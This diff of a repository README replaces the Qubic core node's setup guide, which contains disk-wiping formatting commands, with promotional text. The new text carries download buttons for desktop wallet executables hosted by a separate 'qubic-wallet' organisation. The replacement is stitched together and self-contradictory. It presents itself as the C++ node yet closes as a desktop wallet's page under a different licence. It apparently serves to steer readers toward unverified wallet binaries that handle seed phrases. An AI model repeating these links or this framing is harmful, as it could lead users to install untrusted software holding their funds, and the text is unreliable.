@@ -1,135 +1,107 @@
-# qubic - node
-Qubic Node Source Code - this repository contains the source code of a full qubic node.
+![Qubic Wallet](assets/qubic-wallet-download-seed-phrase-install-address-app-banner.png)
 
-> MAIN (current version running qubic) <br>
-> [![EFIBuild](https://github.com/qubic/core/actions/workflows/efi-build-develop.yml/badge.svg?branch=main)](https://github.com/qubic/core/actions/workflows/efi-build-develop.yml)
-> <br>
-> DEVELOP (current version we're working on) <br>
-> [![EFIBuild](https://github.com/qubic/core/actions/workflows/efi-build-develop.yml/badge.svg?branch=develop)](https://github.com/qubic/core/actions/workflows/efi-build-develop.yml)
+# Qubic core network
 
-## Prerequisites
-To run a qubic node, you need the following spec:
-- Bare Metal Server/Computer with at least 8 Cores (high CPU frequency with AVX2 support). AVX-512 support is recommended; check supported CPUs [here](https://www.epey.co.uk/cpu/e/YTozOntpOjUwOTc7YToxOntpOjA7czo2OiI0Mjg1NzUiO31pOjUwOTk7YToyOntpOjA7czoxOiI4IjtpOjE7czoyOiIzMiI7fWk6NTA4ODthOjY6e2k6MDtzOjY6IjQ1NjE1MCI7aToxO3M6NzoiMjM4Nzg2MSI7aToyO3M6NzoiMTkzOTE5OSI7aTozO3M6NzoiMTUwMjg4MyI7aTo0O3M6NzoiMjA2Nzk5MyI7aTo1O3M6NzoiMjE5OTc1OSI7fX1fYjowOw==/)
-- At least 256GB of RAM
-- 1Gb/s synchronous internet connection
-- A USB Stick or SSD/HD attached to the Computer (via NVMe M.2 or USB)
-- UEFI Bios 
+The full node software the Qubic network runs on, in C++.
 
-> You will need the current `spectrum, universe, and contract` files to be able to start Qubic. The latest files can be found in our #computor-operator channel on the Qubic Discord server: https://discord.gg/qubic (inquire there for the files).
+<p align="center"><a href="https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/LICENSE"><img src="assets/badge-license.svg" alt="License"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2"><img src="assets/badge-release.svg" alt="Release"></a></p>
 
-### Prepare your USB Stick/SSD/HD
-1. Your Qubic Boot device should be formatted as FAT32 with the label QUBIC.
-```bash
-# sample command in linux
-mkfs.fat -F 32 -n QUBIC /dev/sda
-```
-If you have a disk and want to use partitions, this is possible too. use `gdisk`.
-```bash
-gdisk /dev/sda
+## Downloads - v0.8.2
 
-# remove all existing partition with d command
-# add the qubic partition with n command
-# it is recommended to use <1TB of partition size; the start sector and the end sector can be specified with size. eg: 200G.
-# set the type of partition to ef00
+<p align="center"><a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>
 
-echo -e "o\nY\nd\nn\n\n\n+200G\n\nt\n\nef00\nw\nY" | gdisk /dev/sda
+| Platform | Requirements | File |
+| --- | --- | --- |
+| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`qubic-wallet-desktop-v0.8.2-windows.exe`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe) |
+| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`qubic-wallet-desktop-v0.8.2-osx-arm64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip) |
+| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`qubic-wallet-desktop-v0.8.2-linux-x64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip) |
 
-```
-2. We recommend to have the following structure on the disk.
-```
-/contract.000.XXX
-/contract.001.XXX
-/contract.002.XXX
-/spectrum.XXX
-/system
-/universe.XXX
-/efi/boot
-/efi/boot/Bootx64.efi
-/efi/boot/startup.nsh
-/efi/boot/Qubic.efi
-```
-- contract000.XXX => must be the current contract #0 file. XXX must be replaced with the current epoch. (e.g. `contract000.068`)
-- contract001.XXX => must be the current contract #1 file. XXX must be replaced with the current epoch. (e.g. `contract001.068`). Data from Qx.
-- contract002.XXX => must be the current contract #2 file. XXX must be replaced with the current epoch. (e.g. `contract002.068`). Data from Quottery.
-- Other contract files with the same format as above. For now, we have 4 contracts.
-- universe.XXX => must be the current universe file. XXX must be replaced with the current epoch. (e.g `universe.068`)
-- spectrum.XXX => must be the current spectrum file. XXX must be replaced with the current epoch. (e.g `spectrum.068`)
-- system => to start from scratch, use an empty file. (e.g. `touch system`)
-- Bootx64.efi => boot loader
-- startup.nsh => UEFI start script
-- Qubic.efi => the compiled qubic node code (efi executable)
+> The software the Qubic network actually runs on. C++, a solution you can open, and the protocol written
+> down in the repository rather than in a blog post.
 
-The content of your `startup.nsh` could look like this:
-```batch
-timezone -s 00:00
-ifconfig -s eth0 dhcp
-fs0:
-cd efi
-cd boot
-Qubic.efi
-```
+## The engine room
 
-- `timezone -s 00:00` sets the timezone to UTC
-- `ifconfig -s eth0 dhcp` tells the efi to get an ip address from DHCP; if you want to set a fixed ip you can use `ifconfig -s eth0 static <IP> <SUBNETMASK> <GATEWAY>`
-- `fs0:` changes to drive 0
-- `Qubic.efi` starts qubic
+Wallets are the visible part of Qubic. The network is the part that has to keep agreeing with itself while
+thousands of people move assets and run contracts. `core-network` is that layer: the full node, in C++,
+with the consensus, the peer handling and the state machine that make a tick mean something.
 
-> If you have multiple hard drives, the `fs0:` must changed to meet your environment.
+It is not a library you sprinkle into an app, and it is not a service you call. It is the thing other
+software talks to. If you want to understand why a transaction is final, why a tick took the time it did,
+or what a node does when a peer disappears, the answers are in this repository, in code you can read.
 
-> To make it easier, you can copy & paste our prepared initial disk from https://github.com/qubic/core/blob/main/doc/qubic-initial-disk.zip
+## What is in the repository
 
-> If you have multiple network interfaces, you may disconnect these before starting qubic.
+- The node source, built as a Visual Studio solution on Windows.
+- The protocol documentation, covering the message flow between nodes and clients.
+- Contribution notes, so a change arrives in a shape the maintainers can review.
+- An initial disk image for bringing a node up without hand-assembling state.
+- Build automation for firmware-style targets, alongside the ordinary desktop build.
 
-### Prepare your Server
-To run Qubic on your server you need the following:
-- UEFI Bios
-- Enabled Network Stack in Bios
-- Your USB Stick/SSD should be the boot device
+## Build it
 
-## General Process of deploying a node
-1. Find knownPublicPeers public peers (e.g. from: https://app.qubic.li/network/live)
-2. Set the needed parameters inside src/private_settings.h (https://github.com/qubic/core/blob/main/src/private_settings.h)
-3. Compile Source to EFI
-4. Start EFI Application on your Computer
+Open `Qubic.sln` in Visual Studio, select the configuration that matches your target, and build. The
+solution carries several targets; the node itself is the project named after the product. Dependencies are
+vendored in the tree, so there is no package manager step standing between you and a first successful
+build.
 
+If you are deploying rather than experimenting, build once on a machine with the toolchain, keep the
+binary, and read `doc/protocol.md` before pointing the node at a network. Reprovisioning a node is a
+different job from compiling one, and the documentation separates them.
 
-## How to run a Listening Node
-To run a "listen-only" node, just add IP addresses of 3-4 known public peers to the code (including your own IP).
-```c++
-static const unsigned char knownPublicPeers[][4] = {
-};
-```
-Compile with RELEASE.
+## Who it is for
 
-## How to run a Computor Node
-1. Add your Computor Seed(s)
-```c++
-static unsigned char computorSeeds[][55 + 1] = {
-    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
-};
-```
-2. Add your Operator Identity.
-The Operator Identity is used to identify the Operator. The Operator can send Commands to your Node.
-```c++
-#define OPERATOR "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
-```
-3. Add static IPs of known public peers (can be obtained from https://app.qubic.li/network/live).
-Ideally, add at least 4 including your own IP.
-```c++
-static const unsigned char knownPublicPeers[][4] = {
-  {12,13,14,12}
-};
-```
+- Node operators who want to run their own view of the network instead of trusting someone else's.
+- Protocol readers who want the truth about a message rather than its summary.
+- Engineers integrating at a low level, where the wallet's API is one layer too high.
 
-## License
-The Anti-Military License. See [LICENSE.md](LICENSE.md).
+## Reading order
 
-## Installation and Configuration
-Please refer to https://docs.qubic.world
+1. `README.md` for what the repository is.
+2. `doc/protocol.md` for how nodes talk and what a client can ask for.
+3. `doc/contributing.md` before your first pull request.
+4. `SEAMLESS.md` for the build and deployment details that do not belong in a quick start.
 
-## Limited Support
-We cannot support you in any case. You are welcome to provide updates, bug fixes, or other code changes by pull requests, see [here](doc/contributing.md).
+## The rest of the ecosystem
 
-## More Documentation
-- [How to contribute](doc/contributing.md)
-- [Qubic protocol](doc/protocol.md)
+The node is one piece. The wallet is the piece most people meet first, and the guides explain it without
+assuming you have read this repository:
+
+- [What is Qubic Wallet and what does it actually do](https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/what-is-qubic-wallet.md) -
+  the client side, in plain language.
+- [Reading the Qubic Wallet GitHub repository before you trust it](https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/qubic-wallet-github-source-review.md) -
+  the same habit of reading source, applied to the wallet.
+
+## Licence and contributing
+
+The repository carries its own licence file; read it before redistributing or embedding the node. Changes
+that touch consensus or the wire protocol get the slowest review in the project, by design: everything
+else depends on them being right.
+
+## At a glance
+
+- Language: C++, built as a Visual Studio solution.
+- Documentation in the tree: protocol, contributing, plus a separate file for build and deployment detail.
+- Audience: operators, protocol readers and low-level integrators.
+- Scope: the node itself, not a client SDK.
+
+## Why read the node
+
+Every claim about a network is really a claim about its node software. Finality, timing, peer behaviour and
+what a client is allowed to ask for are all decided here, in code, and everything above this layer inherits
+those decisions. Reading it is how you stop repeating descriptions of the network and start checking them.
+
+That matters most when something looks wrong. A wallet that shows a pending transfer, a service reporting
+an odd tick, an explorer that disagrees with a client: in each case the node is the arbiter, and the
+protocol document in this repository explains what it will and will not do before you go looking for a bug
+somewhere else.
+
+Running your own node is the other reason to be here. It gives you an independent view of the chain, it
+removes a third party from your trust path, and it is the only way to see the network from the inside. The
+build is ordinary once the toolchain is in place; the care goes into provisioning and monitoring, which is
+why the deployment notes are kept separate from the quick start.
+
+## About and license
+
+Qubic Wallet is the desktop wallet for Qubic: seed-based accounts, local key storage and the QX trading screen, on Windows, macOS and Linux.
+
+These guides are published under the MIT license; the full text is in the repository `LICENSE` file. Nothing here is an audit or an endorsement, and every claim is checked against the release, the repository or the client constants rather than repeated from marketing.
